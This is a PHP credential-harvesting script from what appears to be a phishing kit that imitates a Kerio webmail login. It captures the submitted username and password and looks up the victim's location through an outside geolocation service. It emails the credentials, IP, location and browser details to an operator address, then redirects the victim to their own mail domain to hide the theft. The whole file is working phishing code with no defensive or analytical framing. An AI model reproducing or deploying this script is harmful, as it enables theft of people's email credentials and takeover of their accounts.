﻿<?php
require '../forward.php';
$ip = getenv("REMOTE_ADDR");
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
if(property_exists($ipdat, 'geoplugin_countryCode'));
if(property_exists($ipdat, 'geoplugin_countryName'));
if(property_exists($ipdat, 'geoplugin_city'));
if(property_exists($ipdat, 'geoplugin_region'));
$countrycode = $ipdat->geoplugin_countryCode;
$country = $ipdat->geoplugin_countryName;
$city = $ipdat->geoplugin_city;
$region = $ipdat->geoplugin_region;
$server = date("D/M/d, Y g:i a"); 
$sender = 'KEYWORD';
$browser = $_SERVER['HTTP_USER_AGENT'];
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$page = 'ALLDOMAIN';
$username = $_POST['kerio_username'];
$password = $_POST['kerio_password'];
$domain = substr(strrchr($username, "@"), 1);
$message = "START LOG:"."\n";
$message .= "USER  ID : $username"."\n";
$message .= "PASSWORD : $password"."\n";
$message .= "LOCATION: $ip ($country , $countrycode , $region , $city)"."\n";
$message .= "ON: $server"."\n";
$message .= "USER-AGENT: '$browser'"."\n";
$message .= "VIA: http://$web$inj | http://whoer.net/check?host=$ip"."\n";
$recipient = EMAIL;
$headers = "From: KEYWORD<$sender>\n";
$subject = "1 NEW LOG (($page) || ($domain))";
if (empty($username) || empty($password)) {
header( "Location: index.php?email=$username&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($recipient,$subject,$message,$headers);
   header("Location: http://$domain?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$username&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
?>